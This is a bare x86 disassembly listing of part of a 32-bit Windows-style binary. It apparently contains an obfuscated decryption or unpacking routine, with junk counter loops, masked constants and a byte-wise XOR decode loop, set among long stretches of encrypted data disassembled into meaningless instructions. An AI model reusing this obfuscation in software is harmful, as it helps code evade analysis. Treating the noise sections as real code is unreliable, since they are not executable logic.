  40a60f:	mov    ebp,DWORD PTR [ebx]
  40a611:	jmp    FWORD PTR [edx-0x33]
  40a614:	std    
  40a615:	lea    ebp,[ebp+0x47]
  40a618:	mov    ds:0x517927f8,al
  40a61d:	cwde   
  40a61e:	out    0xc8,eax
  40a620:	mov    BYTE PTR [eax],0xda
  40a623:	call   0xeb44624f
  40a628:	mov    dl,0xab
  40a62a:	mov    ecx,cs
  40a62c:	sti    
  40a62d:	xchg   esi,eax
  40a62e:	mov    bl,0x5a
  40a630:	jns    0x40a66a
  40a632:	jmp    0x68c5f1b3
  40a637:	cmp    eax,0x97a4d69
  40a63c:	test   BYTE PTR [eax+0x4],dl
  40a63f:	addr16 adc al,0xa7
  40a642:	mov    DWORD PTR [ecx],edx
  40a644:	dec    esp
  40a645:	scas   eax,DWORD PTR es:[edi]
  40a646:	jb     0x40a65a
  40a648:	add    BYTE PTR [ecx-0x5],dh
  40a64b:	dec    esi
  40a64c:	rol    cl,0x3
  40a64f:	iret   
  40a650:	lds    ebp,FWORD PTR [ebx+0x5b]
  40a653:	jae    0x40a690
  40a655:	pop    ecx
  40a656:	xor    BYTE PTR [ebx+eiz*1+0x31],ah
  40a65a:	(bad)  
  40a65c:	std    
  40a65d:	sbb    bl,BYTE PTR [eax]
  40a65f:	sar    BYTE PTR [esi],cl
  40a661:	dec    esp
  40a662:	sub    BYTE PTR [eax-0x72],ah
  40a665:	out    0xe0,al
  40a667:	loopne 0x40a623
  40a669:	mov    esi,0x85071b0e
  40a66e:	ret    0x7a76
  40a671:	inc    ebx
  40a672:	xor    ebx,DWORD PTR [edx+0x4f]
  40a675:	int    0x98
  40a677:	xor    edx,ebx
  40a679:	cli    
  40a67a:	inc    esi
  40a67b:	ins    BYTE PTR es:[edi],dx
  40a67c:	aaa    
  40a67d:	not    DWORD PTR [edi]
  40a67f:	mov    ?,esp
  40a681:	dec    esp
  40a682:	push   esp
  40a683:	inc    ecx
  40a684:	inc    eax
  40a685:	int3   
  40a686:	leave  
  40a687:	and    eax,0xd1bd9cdc
  40a68c:	inc    ebx
  40a68d:	xor    al,0xe5
  40a68f:	jns    0x40a697
  40a691:	xchg   BYTE PTR [eax],al
  40a693:	imul   esp,DWORD PTR [edi],0xffffff96
  40a696:	xlat   BYTE PTR ds:[ebx]
  40a697:	cli    
  40a698:	je     0x40a6d9
  40a69a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a69b:	push   edi
  40a69c:	inc    eax
  40a69d:	cmp    al,0xf8
  40a69f:	jle    0x40a71b
  40a6a1:	pop    ebx
  40a6a2:	mov    ah,0xda
  40a6a4:	sub    BYTE PTR [ebp-0x26],ch
  40a6a7:	jbe    0x40a658
  40a6a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a6aa:	call   0xaa748f26
  40a6af:	jbe    0x40a65e
  40a6b1:	out    0x36,al
  40a6b3:	and    ebp,eax
  40a6b5:	ss cli 
  40a6b7:	inc    ecx
  40a6b8:	push   ebp
  40a6b9:	iret   
  40a6ba:	dec    edi
  40a6bb:	ds int3 
  40a6bd:	xor    dl,BYTE PTR [edi+edi*2-0x1a]
  40a6c1:	mov    edx,esi
  40a6c3:	add    al,0xdd
  40a6c5:	leave  
  40a6c6:	lock adc esp,DWORD PTR [ecx-0x77]
  40a6ca:	xor    BYTE PTR [ebx+0x3a1e10f2],ch
  40a6d0:	sub    edi,edi
  40a6d2:	mov    edi,0x7ce9dd9e
  40a6d7:	ins    BYTE PTR es:[edi],dx
  40a6d8:	sbb    al,0x3
  40a6da:	mov    esp,0x149bd412
  40a6df:	jmp    0x8863001
  40a6e4:	mov    DWORD PTR ds:0x42861f,0x1a
  40a6ee:	cmp    DWORD PTR ds:0x42861f,0x0
  40a6f5:	je     0x40a72f
  40a6fb:	cmp    DWORD PTR ds:0x42861f,0x24
  40a702:	jbe    0x40a72f
  40a708:	jmp    0x40a71d
  40a70d:	push   0x42862f
  40a712:	push   0x428042
  40a717:	call   DWORD PTR ds:0x4287cb
  40a71d:	mov    edx,DWORD PTR ds:0x42861f
  40a723:	dec    edx
  40a724:	mov    DWORD PTR ds:0x42861f,edx
  40a72a:	jmp    0x40a6ee
  40a72f:	mov    eax,DWORD PTR [ebp-0x24]
  40a732:	and    DWORD PTR ds:0x42866f,0x0
  40a73c:	jmp    0x40a74e
  40a741:	mov    edx,DWORD PTR ds:0x42866f
  40a747:	inc    edx
  40a748:	mov    DWORD PTR ds:0x42866f,edx
  40a74e:	cmp    DWORD PTR ds:0x42866f,0x17
  40a755:	jae    0x40a78b
  40a75b:	cmp    DWORD PTR ds:0x42866f,0x1b
  40a762:	jl     0x40a78b
  40a768:	jmp    0x40a786
  40a76d:	push   DWORD PTR [ebp-0x28]
  40a770:	push   DWORD PTR [ebp-0x18]
  40a773:	push   0x56d8
  40a778:	push   0x2d04
  40a77d:	push   DWORD PTR [ebp-0x10]
  40a780:	call   DWORD PTR ds:0x42879f
  40a786:	jmp    0x40a741
  40a78b:	mov    edx,DWORD PTR [ebp+0x8]
  40a78e:	xor    eax,ecx
  40a790:	add    eax,esi
  40a792:	cmp    edx,eax
  40a794:	mov    DWORD PTR ds:0x42860b,0x4a21
  40a79e:	jbe    0x40a816
  40a7a4:	mov    eax,DWORD PTR [ebp-0x24]
  40a7a7:	mov    DWORD PTR ds:0x428617,0x16
  40a7b1:	cmp    DWORD PTR ds:0x428617,0x0
  40a7b8:	je     0x40a809
  40a7be:	cmp    DWORD PTR ds:0x428617,0x4
  40a7c5:	ja     0x40a809
  40a7cb:	jmp    0x40a7db
  40a7d0:	push   0x5454
  40a7d5:	call   DWORD PTR ds:0x4287a3
  40a7db:	cmp    DWORD PTR ds:0x428617,0x5
  40a7e2:	jne    0x40a7f7
  40a7e8:	xor    edx,edx
  40a7ea:	add    edx,DWORD PTR ds:0x428617
  40a7f0:	dec    edx
  40a7f1:	mov    DWORD PTR ds:0x428617,edx
  40a7f7:	mov    edx,DWORD PTR ds:0x428617
  40a7fd:	dec    edx
  40a7fe:	mov    DWORD PTR ds:0x428617,edx
  40a804:	jmp    0x40a7b1
  40a809:	xor    eax,ecx
  40a80b:	add    eax,esi
  40a80d:	adc    edx,0x5d89
  40a813:	mov    DWORD PTR [ebp+0x8],eax
  40a816:	sub    edx,DWORD PTR ds:0x42867b
  40a81c:	mov    eax,DWORD PTR [ebp-0x28]
  40a81f:	mov    edx,DWORD PTR [ebp+0x8]
  40a822:	xor    eax,ecx
  40a824:	mov    DWORD PTR ds:0x428677,0x29fb
  40a82e:	add    eax,esi
  40a830:	sub    DWORD PTR ds:0x42865f,0x428667
  40a83a:	imul   eax,edx
  40a83d:	and    DWORD PTR ds:0x42866b,0x0
  40a847:	xor    edx,edx
  40a849:	xor    edx,DWORD PTR ds:0x42866b
  40a84f:	inc    edx
  40a850:	mov    DWORD PTR ds:0x42866b,edx
  40a856:	cmp    DWORD PTR ds:0x42866b,0x4
  40a85d:	jge    0x40a89f
  40a863:	jmp    0x40a876
  40a868:	push   DWORD PTR [ebp-0x1c]
  40a86b:	push   0x428034
  40a870:	call   DWORD PTR ds:0x4287a7
  40a876:	cmp    DWORD PTR ds:0x42866b,0x3
  40a87d:	jne    0x40a892
  40a883:	xor    edx,edx
  40a885:	xor    edx,DWORD PTR ds:0x42866b
  40a88b:	inc    edx
  40a88c:	mov    DWORD PTR ds:0x42866b,edx
  40a892:	cmp    DWORD PTR ds:0x42866b,0x10
  40a899:	jb     0x40a847
  40a89f:	mov    DWORD PTR [ebp+0x8],eax
  40a8a2:	mov    edx,DWORD PTR ds:0x428693
  40a8a8:	mov    edx,DWORD PTR [edx]
  40a8aa:	sbb    DWORD PTR ds:0x42861f,edx
  40a8b0:	mov    eax,DWORD PTR [ebp-0x14]
  40a8b3:	mov    edx,DWORD PTR [ebp+0x8]
  40a8b6:	xor    eax,ecx
  40a8b8:	add    eax,esi
  40a8ba:	cmp    edx,eax
  40a8bc:	je     0x40aa1e
  40a8c2:	mov    eax,DWORD PTR [ebp+0x8]
  40a8c5:	mov    DWORD PTR [ebp-0x20],eax
  40a8c8:	mov    eax,DWORD PTR [ebp-0x4]
  40a8cb:	add    eax,DWORD PTR [ebp-0x30]
  40a8ce:	mov    DWORD PTR [ebp-0x2c],0xf89c85b0
  40a8d5:	mov    DWORD PTR [ebp-0x1c],edi
  40a8d8:	mov    DWORD PTR [ebp-0x34],0xf89c85b2
  40a8df:	mov    DWORD PTR [ebp-0x10],eax
  40a8e2:	mov    DWORD PTR [ebp-0x40],0xf89c85b3
  40a8e9:	mov    DWORD PTR [ebp-0xc],edi
  40a8ec:	mov    eax,DWORD PTR [ebp-0x2c]
  40a8ef:	xor    eax,ecx
  40a8f1:	add    eax,esi
  40a8f3:	jmp    0x40a9da
  40a8f8:	mov    DWORD PTR [ebp-0x38],0xf89c85bb
  40a8ff:	mov    DWORD PTR [ebp-0x3c],0xf89c858e
  40a906:	mov    eax,DWORD PTR [ebp-0xc]
  40a909:	mov    edx,DWORD PTR [ebp+0x8]
  40a90c:	xor    eax,ecx
  40a90e:	add    eax,esi
  40a910:	imul   eax,edx
  40a913:	mov    edx,DWORD PTR [ebp-0x10]
  40a916:	mov    al,BYTE PTR [eax+edx*1]
  40a919:	mov    BYTE PTR [ebp+0xf],al
  40a91c:	mov    eax,DWORD PTR [ebp-0xc]
  40a91f:	mov    edx,DWORD PTR [ebp+0x8]
  40a922:	xor    eax,ecx
  40a924:	add    eax,esi
  40a926:	imul   eax,edx
  40a929:	mov    edx,DWORD PTR [ebp-0x34]
  40a92c:	xor    edx,ecx
  40a92e:	add    eax,edx
  40a930:	mov    edx,DWORD PTR [ebp-0x10]
  40a933:	movzx  eax,BYTE PTR [eax+edx*1+0x3272ec]
  40a93b:	mov    edx,DWORD PTR [ebp-0x38]
  40a93e:	xor    edx,ecx
  40a940:	lea    eax,[edx+eax*1+0x3272ec]
  40a947:	movzx  edx,BYTE PTR [ebp+0xf]
  40a94b:	xor    edx,eax
  40a94d:	mov    BYTE PTR [ebp+0xf],dl
  40a950:	mov    al,BYTE PTR [ebp+0xf]
  40a953:	mov    edx,DWORD PTR [ebp-0xc]
  40a956:	mov    ebx,DWORD PTR [ebp+0x8]
  40a959:	xor    edx,ecx
  40a95b:	add    edx,esi
  40a95d:	imul   edx,ebx
  40a960:	mov    ebx,DWORD PTR [ebp-0x10]
  40a963:	mov    BYTE PTR [edx+ebx*1],al
  40a966:	mov    eax,DWORD PTR [ebp-0xc]
  40a969:	mov    edx,DWORD PTR [ebp+0x8]
  40a96c:	xor    eax,ecx
  40a96e:	add    eax,esi
  40a970:	imul   eax,edx
  40a973:	mov    edx,DWORD PTR [ebp-0x10]
  40a976:	mov    al,BYTE PTR [eax+edx*1]
  40a979:	mov    BYTE PTR [ebp+0xf],al
  40a97c:	mov    eax,DWORD PTR [ebp-0xc]
  40a97f:	mov    edx,DWORD PTR [ebp+0x8]
  40a982:	xor    eax,ecx
  40a984:	add    eax,esi
  40a986:	imul   eax,edx
  40a989:	mov    edx,DWORD PTR [ebp-0x1c]
  40a98c:	xor    edx,ecx
  40a98e:	add    eax,edx
  40a990:	mov    edx,DWORD PTR [ebp-0x10]
  40a993:	movzx  eax,BYTE PTR [eax+edx*1+0x3272ec]
  40a99b:	mov    edx,DWORD PTR [ebp-0x3c]
  40a99e:	xor    edx,ecx
  40a9a0:	lea    eax,[edx+eax*1+0x3272ec]
  40a9a7:	movzx  edx,BYTE PTR [ebp+0xf]
  40a9ab:	xor    edx,eax
  40a9ad:	mov    BYTE PTR [ebp+0xf],dl
  40a9b0:	mov    al,BYTE PTR [ebp+0xf]
  40a9b3:	mov    edx,DWORD PTR [ebp-0xc]
  40a9b6:	mov    ebx,DWORD PTR [ebp+0x8]
  40a9b9:	xor    edx,ecx
  40a9bb:	add    edx,esi
  40a9bd:	imul   edx,ebx
  40a9c0:	mov    ebx,DWORD PTR [ebp-0x10]
  40a9c3:	mov    BYTE PTR [edx+ebx*1],al
  40a9c6:	mov    eax,DWORD PTR [ebp-0x40]
  40a9c9:	mov    edx,DWORD PTR [ebp-0x1c]
  40a9cc:	xor    eax,ecx
  40a9ce:	xor    edx,ecx
  40a9d0:	add    eax,esi
  40a9d2:	add    edx,esi
  40a9d4:	imul   eax,edx
  40a9d7:	add    eax,DWORD PTR [ebp+0x8]
  40a9da:	mov    DWORD PTR [ebp+0x8],eax
  40a9dd:	mov    eax,DWORD PTR [ebp+0x8]
  40a9e0:	mov    edx,DWORD PTR [ebp-0x20]
  40a9e3:	cmp    edx,eax
  40a9e5:	jb     0x40a8f8
  40a9eb:	mov    eax,DWORD PTR [ebp-0x1c]
  40a9ee:	mov    edx,DWORD PTR [ebp-0x20]
  40a9f1:	xor    eax,ecx
  40a9f3:	add    eax,esi
  40a9f5:	imul   eax,edx
  40a9f8:	mov    edx,DWORD PTR [ebp-0x2c]
  40a9fb:	xor    edx,ecx
  40a9fd:	add    edx,esi
  40a9ff:	or     eax,edx
  40aa01:	mov    edx,DWORD PTR [ebp-0x8]
  40aa04:	xor    edx,ecx
  40aa06:	add    eax,edx
  40aa08:	mov    edx,DWORD PTR [ebp-0x8]
  40aa0b:	xor    edx,ecx
  40aa0d:	add    eax,edx
  40aa0f:	mov    edx,DWORD PTR [ebp-0x4]
  40aa12:	lea    eax,[eax+edx*1+0x64e5d8]
  40aa19:	jmp    0x40aa2d
  40aa1e:	mov    eax,DWORD PTR [ebp-0x8]
  40aa21:	mov    edx,DWORD PTR [ebp-0x4]
  40aa24:	xor    eax,ecx
  40aa26:	lea    eax,[eax+edx*1+0x3272ec]
  40aa2d:	mov    DWORD PTR [ebp-0x4],eax
  40aa30:	mov    eax,DWORD PTR [ebp-0x8]
  40aa33:	xor    eax,ecx
  40aa35:	mov    edx,0xffcd8d14
  40aa3a:	sub    edx,eax
  40aa3c:	add    edx,DWORD PTR [ebp-0x18]
  40aa3f:	mov    eax,DWORD PTR [ebp-0x8]
  40aa42:	mov    ebx,DWORD PTR [ebp-0x4]
  40aa45:	xor    eax,ecx
  40aa47:	add    eax,esi
  40aa49:	imul   eax,ebx
  40aa4c:	cmp    eax,edx
  40aa4e:	jbe    0x4082fa
  40aa54:	pop    ebx
  40aa55:	pop    edi
  40aa56:	pop    esi
  40aa57:	leave  
  40aa58:	ret    0x8
  40aa5b:	push   ebp
  40aa5c:	mov    ebp,esp
  40aa5e:	sub    esp,0x10
  40aa61:	mov    eax,ds:0x4286a3
  40aa66:	mov    ecx,DWORD PTR ds:0x428727
  40aa6c:	sub    ecx,eax
  40aa6e:	add    eax,DWORD PTR [eax+ecx*1]
  40aa71:	mov    eax,0xf89c85b0
  40aa76:	mov    DWORD PTR [ebp-0x4],eax
  40aa79:	mov    DWORD PTR [ebp-0x8],0xf89c85b1
  40aa80:	mov    edx,DWORD PTR ds:0x4286db
  40aa86:	xor    ecx,ecx
  40aa88:	or     ecx,DWORD PTR ds:0x428717
  40aa8e:	sub    ecx,edx
  40aa90:	xor    edx,DWORD PTR [edx+ecx*1]
  40aa93:	mov    ecx,DWORD PTR [ebp-0x4]
  40aa96:	or     edx,0x191e
  40aa9c:	push   esi
  40aa9d:	and    DWORD PTR ds:0x4285db,0x0
  40aaa7:	mov    edx,DWORD PTR ds:0x4285db
  40aaad:	inc    edx
  40aaae:	mov    DWORD PTR ds:0x4285db,edx
  40aab4:	cmp    DWORD PTR ds:0x4285db,0x1e
  40aabb:	jl     0x40aae5
  40aac1:	jmp    0x40aad8
  40aac6:	push   0x428028
  40aacb:	push   0x1
  40aacd:	push   0x77f2
  40aad2:	call   DWORD PTR ds:0x4287ab
  40aad8:	cmp    DWORD PTR ds:0x4285db,0x13
  40aadf:	jb     0x40aaa7
  40aae5:	mov    edx,0x75108a4
  40aaea:	sbb    esi,0x397d
  40aaf0:	xor    ecx,edx
  40aaf2:	and    DWORD PTR ds:0x42866f,0x0
  40aafc:	xor    esi,esi
  40aafe:	add    esi,DWORD PTR ds:0x42866f
  40ab04:	inc    esi
  40ab05:	mov    DWORD PTR ds:0x42866f,esi
  40ab0b:	cmp    DWORD PTR ds:0x42866f,0x21
  40ab12:	jge    0x40ceb9
  40ab18:	jmp    0x40ab28
  40ab1d:	push   0x42801b
  40ab22:	call   DWORD PTR ds:0x4287af
  40ab28:	cmp    DWORD PTR ds:0x42866f,0x1c
  40ab2f:	jb     0x40aafc
  40ab35:	jmp    0x40ceb9
  40ab3a:	jo     0x40aaf5
  40ab3c:	aam    0x1d
  40ab3e:	mov    DWORD PTR [ebx],0xd07b7bab
  40ab44:	xor    DWORD PTR [ecx],edx
  40ab46:	dec    BYTE PTR [ebp+0xa]
  40ab49:	retf   
  40ab4a:	adc    al,0xe8
  40ab4c:	jp     0x40abc8
  40ab4e:	adc    ebx,DWORD PTR [edi+0x7a]
  40ab51:	jp     0x40aadb
  40ab53:	push   cs
  40ab54:	imul   ebx,ecx,0x21
  40ab57:	loope  0x40aad9
  40ab59:	int    0x7f
  40ab5b:	sbb    al,0xae
  40ab5d:	or     BYTE PTR [edx+0x1f848b1f],dh
  40ab63:	inc    eax
  40ab64:	retf   
  40ab65:	pusha  
  40ab66:	jl     0x40abaf
  40ab68:	xlat   BYTE PTR ds:[ebx]
  40ab69:	jno    0x40aba3
  40ab6b:	enter  0x6c48,0xc8
  40ab6f:	(bad)  
  40ab70:	cmp    dl,BYTE PTR [ebx-0x1d]
  40ab73:	cld    
  40ab74:	push   esi
  40ab75:	adc    ecx,DWORD PTR ds:0x5f991166
  40ab7b:	adc    al,0x94
  40ab7e:	push   cs
  40ab7f:	pop    ebp
  40ab80:	fild   DWORD PTR [esi]
  40ab82:	xor    eax,0x69f11b04
  40ab87:	add    edi,DWORD PTR [edx-0x80]
  40ab8a:	lods   eax,DWORD PTR ds:[esi]
  40ab8b:	mov    ah,0xce
  40ab8d:	ins    DWORD PTR es:[edi],dx
  40ab8e:	test   al,0x9b
  40ab90:	test   eax,0x7bb7b5d3
  40ab95:	pop    eax
  40ab96:	mov    ebp,0x6be3635
  40ab9b:	out    dx,eax
  40ab9c:	repz (bad) 
  40ab9e:	repnz das 
  40aba0:	fbstp  TBYTE PTR [eax-0x54b99a7b]
  40aba6:	and    esp,ecx
  40aba8:	push   es
  40aba9:	out    dx,al
  40abaa:	outs   dx,BYTE PTR ds:[esi]
  40abab:	adc    al,0x96
  40abad:	test   al,0x20
  40abaf:	rcr    BYTE PTR [ebp-0x5350631a],1
  40abb5:	int    0xe4
  40abb7:	stc    
  40abb8:	mov    dl,0xd6
  40abba:	add    al,0x33
  40abbc:	jb     0x40ab62
  40abbe:	or     edi,ebp
  40abc0:	imul   ebp,DWORD PTR [edx],0x40be09bc
  40abc6:	xor    bh,BYTE PTR [eax]
  40abc8:	cmc    
  40abc9:	cmp    DWORD PTR [ebx+ebp*4],ebx
  40abcc:	(bad)  
  40abcd:	xor    al,0x3d
  40abcf:	mov    bl,BYTE PTR [eax-0x25779a3a]
  40abd5:	dec    esi
  40abd6:	inc    eax
  40abd7:	dec    DWORD PTR [esi-0x7f]
  40abda:	jl     0x40ab7a
  40abdc:	lds    edx,FWORD PTR [ecx-0x46]
  40abdf:	in     al,0x1
  40abe1:	inc    esp
  40abe2:	shl    BYTE PTR [esi-0x78],1
  40abe5:	mov    esi,0x2d526721
  40abea:	in     al,0x4
  40abec:	lods   al,BYTE PTR ds:[esi]
  40abed:	aam    0xb9
  40abef:	fcomip st,st(1)
  40abf1:	pushf  
  40abf2:	aam    0x70
  40abf4:	add    cl,BYTE PTR [eax+0x33]
  40abf7:	fdivr  DWORD PTR [eax-0xbfc29de]
  40abfd:	add    al,0x53
  40abff:	fwait
  40ac00:	int3   
  40ac01:	(bad)  [edi]
  40ac03:	js     0x40ac68
  40ac05:	into   
  40ac06:	mov    esp,0x73a8700a
  40ac0b:	sbb    eax,0xb6372033
  40ac10:	daa    
  40ac11:	std    
  40ac12:	pop    esp
  40ac13:	or     ebx,edi
  40ac15:	mov    ah,0x4f
  40ac17:	jmp    0xaa6c:0xf1391b6b
  40ac1e:	lahf   
  40ac1f:	dec    esi
  40ac20:	mov    gs,WORD PTR [edx-0x75]
  40ac23:	jo     0x40abd0
  40ac25:	ret    
  40ac26:	les    esp,FWORD PTR [edi]
  40ac28:	inc    edx
  40ac29:	adc    ebx,DWORD PTR [edi]
  40ac2b:	leave  
  40ac2c:	cmp    eax,0x4f986f46
  40ac31:	dec    esp
  40ac32:	mov    cl,0x54
  40ac34:	mov    al,ds:0x13949cf8
  40ac39:	fadd   QWORD PTR [ecx-0x539fe884]
  40ac3f:	enter  0x9a2,0x7d
  40ac43:	xlat   BYTE PTR ds:[ebx]
  40ac44:	xchg   BYTE PTR [edi+0x60ecd33e],cl
  40ac4a:	les    edx,FWORD PTR [esi+0x126ca9b]
  40ac50:	lock f2xm1 
  40ac53:	aad    0xfe
  40ac55:	xchg   esp,eax
  40ac56:	pop    ecx
  40ac57:	pop    esp
  40ac58:	lahf   
  40ac59:	shr    DWORD PTR [eax-0x6],1
  40ac5c:	push   es
  40ac5d:	repnz dec ecx
  40ac5f:	les    edi,FWORD PTR ds:0x9b064b82
  40ac65:	mov    dh,0xfa
  40ac67:	mov    eax,ds:0x3b55c740
  40ac6c:	ret    
  40ac6d:	xchg   edx,eax
  40ac6e:	xor    ecx,DWORD PTR [esi-0x6737bbc5]
  40ac74:	scas   al,BYTE PTR es:[edi]
  40ac75:	addr16 loopne 0x40ac9a
  40ac78:	sbb    eax,DWORD PTR [eax+esi*2-0x15150508]
  40ac7f:	shr    BYTE PTR [ebx-0x7f32835e],1
  40ac85:	pop    ecx
  40ac86:	sar    DWORD PTR [ecx+edx*8],cl
  40ac89:	(bad)  
  40ac8a:	into   
  40ac8b:	retf   0xdccc
  40ac8e:	inc    ebp
  40ac8f:	pop    ecx
  40ac90:	cmp    ah,BYTE PTR ds:0x22c88a42
  40ac96:	push   cs
  40ac97:	fnsave [eax-0x8]
  40ac9a:	sub    eax,0xd9f37a3b
  40ac9f:	xchg   ebx,eax
  40aca0:	aam    0x5b
  40aca2:	aam    0x2a
  40aca4:	fstp   TBYTE PTR [ecx+0x71]
  40aca7:	test   edx,edi
  40aca9:	mov    BYTE PTR [edi+eiz*8+0x19708b28],bl
  40acb0:	rcl    al,0x38
  40acb3:	iret   
  40acb4:	mov    eax,0x5e746b8
  40acb9:	aad    0xcb
  40acbb:	std    
  40acbc:	lahf   
  40acbd:	jecxz  0x40acc9
  40acbf:	xchg   DWORD PTR [ecx],esp
  40acc1:	stc    
  40acc2:	dec    edx
  40acc3:	sbb    dl,dh
  40acc5:	es jno 0x40ac6e
  40acc8:	nop
  40acc9:	repz and dh,BYTE PTR [eiz*1-0x1d66c3db]
  40acd1:	mov    ebx,0xdea35264
  40acd6:	xchg   DWORD PTR [ecx-0x21],esp
  40acd9:	rep lods al,BYTE PTR ds:[esi]
  40acdb:	mov    ds:0xaceb366f,eax
  40ace0:	and    eax,0xb939af43
  40ace5:	cmc    
  40ace6:	mov    al,ds:0x2658db75
  40aceb:	mov    cl,0x5a
  40aced:	jb     0x40acf0
  40acef:	mov    gs,WORD PTR [edi+0x76]
  40acf2:	shl    bh,0x81
  40acf5:	into   
  40acf6:	(bad)  
  40acf7:	dec    edx
  40acf8:	mov    ds,edx
  40acfa:	jbe    0x40ad3a
  40acfc:	inc    ebp
  40acfd:	scas   eax,DWORD PTR es:[edi]
  40acfe:	ficomp WORD PTR [eax-0xfe82a2e]
  40ad04:	mov    bh,0x2
  40ad06:	pushf  
  40ad07:	mov    dh,0xc2
  40ad09:	push   edi
  40ad0a:	jmp    0x8b97f926
  40ad0f:	mov    ch,0xb0
  40ad11:	push   es
  40ad12:	popf   
  40ad13:	pushf  
  40ad14:	ss or  al,0x0
  40ad17:	mov    ebp,0xffea0ce5
  40ad1c:	mov    dh,0x61
  40ad1e:	pop    ebp
  40ad1f:	in     eax,0x58
  40ad21:	xchg   ebp,eax
  40ad22:	pop    ds
  40ad23:	add    al,0x15
  40ad25:	sbb    ebp,ecx
  40ad27:	jl     0x40ad26
  40ad29:	push   eax
  40ad2a:	add    al,0x37
  40ad2c:	cli    
  40ad2d:	xor    al,0x9a
  40ad2f:	jl     0x40ad08
  40ad31:	bound  ebx,QWORD PTR [ebx+0x3861d2fd]
  40ad37:	adc    eax,0xc19724dc
  40ad3c:	xor    BYTE PTR [esp+ecx*1+0x2cf30979],ch
  40ad43:	sub    BYTE PTR [edi],ch
  40ad45:	aaa    
  40ad46:	repz (bad) 
  40ad48:	and    BYTE PTR [ebx],al
  40ad4a:	push   0x5d
  40ad4c:	xor    DWORD PTR [ecx+0x66249134],esi
  40ad52:	pop    esi
  40ad53:	xchg   ebx,eax
  40ad54:	cmp    edx,DWORD PTR [esi-0x62464ee0]
  40ad5a:	test   BYTE PTR ds:0x4819e791,0xb8
  40ad61:	pop    es
  40ad62:	stos   BYTE PTR es:[edi],al
  40ad63:	or     eax,0x5aab42c5
  40ad68:	jae    0x40ad11
  40ad6a:	cmp    BYTE PTR [ecx+esi*1+0x47964aad],al
  40ad71:	fwait
  40ad72:	leave  
  40ad73:	sub    ebx,DWORD PTR [ebx-0x5b]
  40ad76:	call   0xfb06:0xbc90b226
  40ad7d:	sub    esi,edx
  40ad7f:	and    eax,0xa6e0d2f4
  40ad84:	retf   
  40ad85:	ins    DWORD PTR es:[edi],dx
  40ad86:	jnp    0x40ad0e
  40ad88:	mov    al,ds:0x484e8f9d
  40ad8d:	ins    DWORD PTR es:[edi],dx
  40ad8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ad8f:	in     al,dx
  40ad90:	pop    eax
  40ad91:	scas   al,BYTE PTR es:[edi]
  40ad92:	(bad)  
  40ad94:	jp     0x40ada0
  40ad96:	inc    esp
  40ad97:	xchg   edi,eax
  40ad98:	in     eax,0x99
  40ad9a:	sub    eax,0xe048ad40
  40ad9f:	or     ebp,DWORD PTR [ebx+ebp*8-0x76]
  40ada3:	stos   DWORD PTR es:[edi],eax
  40ada4:	sub    dh,al
  40ada6:	adc    DWORD PTR [esi+esi*1-0x1bdaa506],eax
  40adad:	cmp    edi,DWORD PTR [ebp+0x4]
  40adb0:	xchg   edi,eax
  40adb1:	mov    eax,DWORD PTR [eax-0xc5faaa1]
  40adb7:	mov    ds:0x61cef773,al
  40adbc:	jle    0x40ad94
  40adbe:	mov    BYTE PTR [ebx-0x2a8143c1],al
  40adc4:	dec    esi
  40adc5:	stos   DWORD PTR es:[edi],eax
  40adc6:	das    
  40adc7:	(bad)  
  40adc8:	out    dx,al
  40adc9:	sbb    al,BYTE PTR [ebx]
  40adcb:	mov    ds:0xae217bb2,al
  40add0:	sbb    ch,ch
  40add2:	adc    al,0xc4
  40add4:	data16 jmp 0x40adc6
  40add7:	dec    edx
  40add8:	jle    0x40ad86
  40adda:	and    eax,0x91c873ce
  40addf:	mov    DWORD PTR [edx],ecx
  40ade1:	push   eax
  40ade2:	jle    0x40ae5d
  40ade4:	in     al,0xdf
  40ade6:	(bad)  
  40ade7:	retf   0x89ed
  40adea:	pop    ds
  40adeb:	xor    al,0x55
  40aded:	je     0x40ae57
  40adef:	or     edx,esp
  40adf1:	sahf   
  40adf2:	mov    edx,0x9ae7712
  40adf7:	stos   BYTE PTR es:[edi],al
  40adf8:	push   edi
  40adf9:	(bad)  
  40adfa:	xlat   BYTE PTR ds:[ebx]
  40adfb:	sbb    al,0xe9
  40adfd:	cmc    
  40adfe:	mov    eax,ds:0xe9948b06
  40ae03:	fwait
  40ae04:	mov    ebp,0x1c1cc05e
  40ae09:	mov    edi,DWORD PTR [edi+0x1c]
  40ae0c:	das    
  40ae0d:	stos   DWORD PTR es:[edi],eax
  40ae0e:	xchg   edx,eax
  40ae0f:	jbe    0x40ae76
  40ae11:	xchg   esi,eax
  40ae12:	leave  
  40ae13:	sahf   
  40ae14:	(bad)  
  40ae15:	jp     0x40adc2
  40ae17:	jne    0x40ad99
  40ae19:	lods   eax,DWORD PTR ds:[esi]
  40ae1a:	inc    ebp
  40ae1b:	xor    eax,0x77406602
  40ae20:	retf   0xe7ac
  40ae23:	dec    ebp
  40ae24:	fist   DWORD PTR [ecx+esi*1]
  40ae27:	xchg   edx,eax
  40ae28:	cs xchg edi,eax
  40ae2a:	repz jno 0x40ae90
  40ae2d:	or     DWORD PTR [edi+eax*1+0x1e],0xfffffffa
  40ae32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ae33:	iret   
  40ae34:	(bad)  
  40ae35:	or     dl,BYTE PTR [ebp+0x51cae39]
  40ae3b:	(bad)  
  40ae3c:	xor    ebp,esi
  40ae3e:	cmp    ecx,ecx
  40ae40:	jno    0x40ae99
  40ae42:	test   BYTE PTR [eax+0x77b19584],ch
  40ae48:	push   0xffffff8e
  40ae4a:	add    cl,cl
  40ae4c:	mov    edx,DWORD PTR [edi]
  40ae4e:	push   0x73c6469f
  40ae53:	mov    esp,0x79910f79
  40ae58:	ret    0x7b9d
  40ae5b:	jmp    0x40ae1c
  40ae5d:	jg     0x40aebb
  40ae5f:	cmp    esi,0xffffff96
  40ae62:	push   ds
  40ae63:	aaa    
  40ae64:	mov    ds:0x1f4215fb,eax
  40ae69:	stos   DWORD PTR es:[edi],eax
  40ae6a:	popf   
  40ae6b:	sti    
  40ae6c:	sub    BYTE PTR [edx+0x7c58737a],cl
  40ae72:	xor    bh,BYTE PTR [edx+0x3437d15d]
  40ae78:	lock std 
  40ae7a:	sbb    BYTE PTR [ecx],bh
  40ae7c:	adc    DWORD PTR [edx+0x34b0c218],edi
  40ae82:	mul    DWORD PTR [ebx+0x5d3daf0f]
  40ae88:	(bad)  
